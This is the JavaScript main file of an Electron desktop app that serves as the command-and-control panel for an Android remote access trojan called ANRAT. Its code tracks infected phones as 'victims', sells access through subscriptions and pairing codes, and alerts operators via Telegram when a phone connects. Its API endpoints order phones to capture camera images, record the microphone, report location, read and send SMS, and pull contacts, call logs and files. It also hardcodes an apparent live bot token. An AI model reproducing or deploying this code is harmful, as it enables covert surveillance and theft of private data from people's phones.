require('dotenv').config();
const { app, BrowserWindow } = require('electron');
const electron = require('electron');
const { ipcMain } = require('electron');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const mysql = require('mysql2/promise');
const axios = require('axios');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;

const path = require('path');
const os = require('os');

//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
let apiServer = null;
//--------------------------------------------------------------

// ========================================
// DATABASE CONNECTION
// ========================================
const db = mysql.createPool({
  host: process.env.DB_HOST || 'localhost',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD || '',
  database: process.env.DB_NAME || 'anrat',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// Telegram configuration
const BOT_TOKEN = "8501377365:AAGQ7HlqWOipJZe8m0DjowJa45klK7o44Rg";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ========================================
// TELEGRAM HELPER FUNCTIONS
// ========================================
async function sendTelegramMessage(chatId, message) {
  if (!BOT_TOKEN) return;
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log(`✅ Telegram message sent to ${chatId}`);
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
  }
}

// ========================================
// DATABASE HELPER FUNCTIONS
// ========================================
async function getPairingCode(code) {
  try {
    const [rows] = await db.execute(
      `SELECT pc.*, s.type, s.users, s.telegram_id
       FROM pairing_codes pc 
       JOIN subscriptions s ON pc.subscription_id = s.id 
       WHERE pc.pairing_code = ? 
       AND pc.used = 0 
       AND pc.expires_at > NOW()`,
      [code]
    );
    return rows[0] || null;
  } catch (error) {
    console.error('Error getting pairing code:', error);
    return null;
  }
}

async function usePairingCode(code, deviceId) {
  try {
    const [result] = await db.execute(
      'UPDATE pairing_codes SET used = 1, used_at = NOW(), device_id = ? WHERE pairing_code = ?',
      [deviceId, code]
    );
    return result.affectedRows > 0;
  } catch (error) {
    console.error('Error using pairing code:', error);
    return false;
  }
}

async function addDevice(subscriptionId, telegramId, deviceId, deviceName) {
  try {
    const [existing] = await db.execute(
      'SELECT * FROM devices WHERE device_id = ?',
      [deviceId]
    );

    if (existing.length > 0) {
      await db.execute(
        'UPDATE devices SET last_active = NOW(), status = "active" WHERE device_id = ?',
        [deviceId]
      );
      return existing[0].id;
    } else {
      const [result] = await db.execute(
        'INSERT INTO devices (subscription_id, telegram_id, device_id, device_name, last_active) VALUES (?, ?, ?, ?, NOW())',
        [subscriptionId, telegramId, deviceId, deviceName]
      );
      return result.insertId;
    }
  } catch (error) {
    console.error('Error adding device:', error);
    return null;
  }
}

async function getDevice(deviceId) {
  try {
    const [rows] = await db.execute(
      `SELECT d.*, s.type, s.users, u.username, u.telegram_id as owner_telegram_id
       FROM devices d 
       JOIN subscriptions s ON d.subscription_id = s.id 
       JOIN users u ON d.telegram_id = u.telegram_id 
       WHERE d.device_id = ? AND d.status = 'active'`,
      [deviceId]
    );
    return rows[0] || null;
  } catch (error) {
    console.error('Error getting device:', error);
    return null;
  }
}

async function getDevicesByTelegramId(telegramId) {
  try {
    const [rows] = await db.execute(
      `SELECT d.*, s.type 
       FROM devices d 
       JOIN subscriptions s ON d.subscription_id = s.id 
       WHERE d.telegram_id = ? 
       AND d.status = 'active' 
       ORDER BY d.last_active DESC`,
      [telegramId]
    );
    return rows;
  } catch (error) {
    console.error('Error getting devices:', error);
    return [];
  }
}

async function updateDeviceLastActive(deviceId) {
  try {
    await db.execute(
      'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
      [deviceId]
    );
    return true;
  } catch (error) {
    console.error('Error updating device:', error);
    return false;
  }
}

async function verifyDeviceOwnership(deviceId, telegramId) {
  try {
    const [rows] = await db.execute(
      'SELECT * FROM devices WHERE device_id = ? AND telegram_id = ? AND status = "active"',
      [deviceId, telegramId]
    );
    return rows.length > 0;
  } catch (error) {
    console.error('Error verifying ownership:', error);
    return false;
  }
}

// ========================================
// EXPRESS API SERVER WITH TELEGRAM INTEGRATION
// ========================================
function createAPIServer(port = 3000) {
  const apiApp = express();
  
  // Middleware
  apiApp.use(cors());
  apiApp.use(bodyParser.json());
  apiApp.use(bodyParser.urlencoded({ extended: true }));

  // ===== API ENDPOINTS =====
  
  // Health check
  apiApp.get('/api/health', (req, res) => {
    res.json({ 
      success: true, 
      status: 'running', 
      version: '2.0.0',
      connectedDevices: Object.keys(victimsList.getVictimList()).length,
      databaseConnected: db ? true : false,
      telegramEnabled: BOT_TOKEN ? true : false
    });
  });

  // Get all victims (with telegram_id filter)
  apiApp.get('/api/victims', async (req, res) => {
    try {
      const { telegram_id } = req.query;
      const victims = victimsList.getVictimList();
      
      if (telegram_id) {
        // Filter victims by telegram_id
        const devices = await getDevicesByTelegramId(telegram_id);
        const deviceIds = devices.map(d => d.device_id);
        
        const filteredVictims = Object.keys(victims)
          .filter(key => deviceIds.includes(key))
          .map(key => ({
            id: key,
            ip: victims[key].ip,
            port: victims[key].port,
            country: victims[key].country,
            manufacturer: victims[key].manf,
            model: victims[key].model,
            release: victims[key].release
          }));
        
        return res.json({ success: true, victims: filteredVictims, total: filteredVictims.length });
      }
      
      // Return all victims if no telegram_id
      const victimsArray = Object.keys(victims).map(key => ({
        id: key,
        ip: victims[key].ip,
        port: victims[key].port,
        country: victims[key].country,
        manufacturer: victims[key].manf,
        model: victims[key].model,
        release: victims[key].release
      }));
      
      res.json({ success: true, victims: victimsArray, total: victimsArray.length });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Get specific victim
  apiApp.get('/api/victims/:id', async (req, res) => {
    try {
      const { telegram_id } = req.query;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }
      
      res.json({ 
        success: true, 
        victim: {
          id: req.params.id,
          ip: victim.ip,
          port: victim.port,
          country: victim.country,
          manufacturer: victim.manf,
          model: victim.model,
          release: victim.release
        }
      });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Send command to victim (with ownership verification)
  apiApp.post('/api/victims/:id/command', async (req, res) => {
    try {
      const { telegram_id } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { order, extra, data } = req.body;
      
      if (!order) {
        return res.status(400).json({ success: false, error: 'Order is required' });
      }

      victim.socket.emit('order', { order, extra, ...data });
      
      await updateDeviceLastActive(req.params.id);
      
      res.json({ success: true, message: 'Command sent successfully' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Camera
  apiApp.post('/api/victims/:id/camera', async (req, res) => {
    try {
      const { telegram_id, cameraId = 0 } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000ca', extra: 'camList' });
      setTimeout(() => {
        victim.socket.emit('order', { order: 'x0000ca', extra: cameraId });
      }, 1000);

      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'Camera capture initiated' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Location
  apiApp.post('/api/victims/:id/location', async (req, res) => {
    try {
      const { telegram_id } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000lm' });
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'Location request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // SMS List
  apiApp.post('/api/victims/:id/sms/list', async (req, res) => {
    try {
      const { telegram_id } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000sm', extra: 'ls' });
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'SMS list request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Send SMS
  apiApp.post('/api/victims/:id/sms/send', async (req, res) => {
    try {
      const { telegram_id, to, message } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      if (!to || !message) {
        return res.status(400).json({ success: false, error: 'Phone number and message are required' });
      }

      victim.socket.emit('order', { 
        order: 'x0000sm', 
        extra: 'sendSMS', 
        to: to, 
        sms: message 
      });

      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'SMS sent successfully' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Contacts
  apiApp.post('/api/victims/:id/contacts', async (req, res) => {
    try {
      const { telegram_id } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000cn' });
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'Contacts request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Call logs
  apiApp.post('/api/victims/:id/calls', async (req, res) => {
    try {
      const { telegram_id } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000cl' });
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'Call logs request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Microphone
  apiApp.post('/api/victims/:id/microphone', async (req, res) => {
    try {
      const { telegram_id, duration = 10 } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000mc', sec: duration });
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'Microphone recording initiated' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // File list
  apiApp.post('/api/victims/:id/files/list', async (req, res) => {
    try {
      const { telegram_id, path = '/storage/emulated/0/' } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { 
        order: 'x0000fm', 
        extra: 'ls', 
        path: path 
      });
      
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'File list request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // File download
  apiApp.post('/api/victims/:id/files/download', async (req, res) => {
    try {
      const { telegram_id, path } = req.body;
      
      if (telegram_id) {
        const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
        if (!isOwner) {
          return res.status(403).json({ success: false, error: 'Access denied' });
        }
      }
      
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      if (!path) {
        return res.status(400).json({ success: false, error: 'File path is required' });
      }

      victim.socket.emit('order', { 
        order: 'x0000fm', 
        extra: 'dl', 
        path: path 
      });
      
      await updateDeviceLastActive(req.params.id);
      res.json({ success: true, message: 'File download initiated' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Start server
  apiServer = apiApp.listen(port, () => {
    console.log(`\n✓ API Server running on http://localhost:${port}`);
    console.log(`✓ API Endpoints: http://localhost:${port}/api/health`);
    console.log(`✓ Database: ${db ? 'Connected' : 'Not Connected'}`);
    console.log(`✓ Telegram: ${BOT_TOKEN ? 'Enabled' : 'Disabled'}\n`);
  });

  return apiServer;
}

// Detect OS
const isLinux = process.platform === 'linux';
const isWindows = process.platform === 'win32';
const isMac = process.platform === 'darwin';
const listeningStatus = {};

function createWindow() {
  display = electron.screen.getPrimaryDisplay();

  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: !isLinux,
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    type: "splash",
    alwaysOnTop: true,
    show: false,
    center: true,
    resizable: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && { backgroundThrottling: false })
    }
  });

  splashWin.loadFile(path.join(__dirname, 'app/splash.html'));

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
  });

  splashWin.on('closed', () => {
    splashWin = null
  })

  win = new BrowserWindow({
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    width: 1200,
    height: 800,
    minWidth: 900,
    minHeight: 600,
    show: false,
    resizable: true,
    center: true,
    frame: isLinux,
    transparent: !isLinux,
    backgroundColor: isLinux ? '#0c094f' : undefined,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && { backgroundThrottling: false })
    }
  });

  if (isLinux) {
    win.setTitle('ANRAT - Android Remote Administration Tool');
  }

  win.loadFile(path.join(__dirname, 'app/index.html'));

  win.on('closed', () => {
    win = null
  })

  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      if (splashWin) {
        splashWin.close();
      }
      win.show();
    }, 2000);
  });
}

app.on('ready', () => {
  createWindow();
  createAPIServer(3000);
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    if (apiServer) {
      apiServer.close();
    }
    app.quit()
  }
})

app.on('activate', () => {
  if (win === null) {
    createWindow()
  }
})

process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
});

// ========================================
// IPC: SOCKET.IO LISTEN WITH PAIRING CODE
// ========================================
ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  try {
    IOs[port] = io.listen(port, {
      maxHttpBufferSize: 1024 * 1024 * 100,
      cors: { origin: "*", methods: ["GET", "POST"] }
    });
    
    IOs[port].sockets.pingInterval = 10000;
    IOs[port].sockets.pingTimeout = 10000;

    IOs[port].sockets.on('connection', async function (socket) {
      var address = socket.request.connection;
      var query = socket.handshake.query;
      var index = query.id;
      var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
      var country = null;
      var geo = geoip.lookup(ip);
      if (geo) country = geo.country.toLowerCase();

      console.log('\n🔌 New connection attempt:');
      console.log(`   Device ID: ${index}`);
      console.log(`   IP: ${ip}`);

      // ========================================
      // PAIRING CODE VALIDATION
      // ========================================
      const pairingCode = query.pairing_code;
      
      if (!pairingCode) {
        console.log('   ❌ No pairing code provided');
        socket.emit('error', { message: 'Pairing code required' });
        socket.disconnect();
        return;
      }

      console.log(`   Pairing Code: ${pairingCode}`);

      const pairingData = await getPairingCode(pairingCode);
      
      if (!pairingData) {
        console.log('   ❌ Invalid or expired pairing code');
        socket.emit('error', { message: 'Invalid or expired pairing code' });
        socket.disconnect();
        return;
      }

      console.log(`   ✅ Valid pairing code for Telegram ID: ${pairingData.telegram_id}`);

      // Check device limit
      const existingDevices = await getDevicesByTelegramId(pairingData.telegram_id);
      const maxDevices = pairingData.users === 0 ? Infinity : parseInt(pairingData.users);
      
      if (existingDevices.length >= maxDevices) {
        console.log(`   ❌ Device limit reached: ${existingDevices.length}/${maxDevices}`);
        socket.emit('error', { message: 'Device limit reached' });
        socket.disconnect();
        return;
      }

      // Mark as used and add device
      await usePairingCode(pairingCode, index);
      const deviceName = `${query.manf} ${query.model}`;
      await addDevice(pairingData.subscription_id, pairingData.telegram_id, index, deviceName);

      console.log(`   ✅ Device paired successfully!`);
      console.log(`   Owner: ${pairingData.telegram_id}`);
      console.log(`   Devices: ${existingDevices.length + 1}/${maxDevices === Infinity ? 'unlimited' : maxDevices}`);

      // Add to victims list
      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

      // Send Telegram notification
      await sendTelegramMessage(pairingData.telegram_id, `
🎉 *New Device Connected!*

📱 Device: ${deviceName}
🆔 ID: \`${index}\`
🌍 IP: ${ip}
📍 Country: ${country || 'Unknown'}
📅 Time: ${new Date().toLocaleString('id-ID')}

Gunakan /victims untuk melihat devices online.
      `);

      // Notification window
      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 280,
        y: display.bounds.height - 78,
        show: false,
        width: 280,
        height: 78,
        resizable: false,
        skipTaskbar: true,
        alwaysOnTop: true,
        webPreferences: {
          nodeIntegration: true,
          enableRemoteModule: true,
          contextIsolation: false
        }
      });

      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () { notification.destroy() }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadFile(path.join(__dirname, 'app/notification.html'));

      win.webContents.send('SocketIO:NewVictim', index);

      // Auto update last active
      const activeInterval = setInterval(async () => {
        await updateDeviceLastActive(index);
      }, 30000);

      socket.on('disconnect', async function () {
        clearInterval(activeInterval);
        victimsList.rmVictim(index);
        
        // Update status to inactive
        try {
          await db.execute(
            'UPDATE devices SET status = "inactive" WHERE device_id = ?',
            [index]
          );
        } catch (error) {
          console.error('Error updating device status:', error);
        }

        // Send disconnect notification
        await sendTelegramMessage(pairingData.telegram_id, `
⚠️ *Device Disconnected*

📱 Device: ${deviceName}
🆔 ID: \`${index}\`
📅 Time: ${new Date().toLocaleString('id-ID')}
        `);

        win.webContents.send('SocketIO:RemoveVictim', index);
        
        if (windows[index]) {
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
          delete windows[index]
        }
      });
    });

    event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port + ' (with Pairing Code validation)');
    listeningStatus[port] = true;
    
  } catch (error) {
    console.error('Listen Error:', error);
    event.reply('SocketIO:ListenError', '[x] Error: ' + error.message);
  }
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    IOs[port].close();
    IOs[port] = null;
    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
    listeningStatus[port] = false;
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

ipcMain.on('openLabWindow', function (e, page, index) {
  let child = new BrowserWindow({
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    parent: win,
    width: 900,
    height: 800,
    minWidth: 800,
    minHeight: 600,
    show: false,
    frame: isLinux,
    transparent: !isLinux,
    backgroundColor: isLinux ? '#0c094f' : undefined,
    resizable: true,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && { backgroundThrottling: false })
    }
  })

  if (isLinux) {
    const victim = victimsList.getVictim(index);
    if (victim && victim !== -1) {
      child.setTitle(`ANRAT Lab - ${victim.model}`);
    }
  }

  windows[index] = child.id;
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(path.join(__dirname, 'app', page));

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    if (victimsList.getVictim(index) && victimsList.getVictim(index) !== -1 && victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca");
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn");
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc");
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm");
    }
  })
});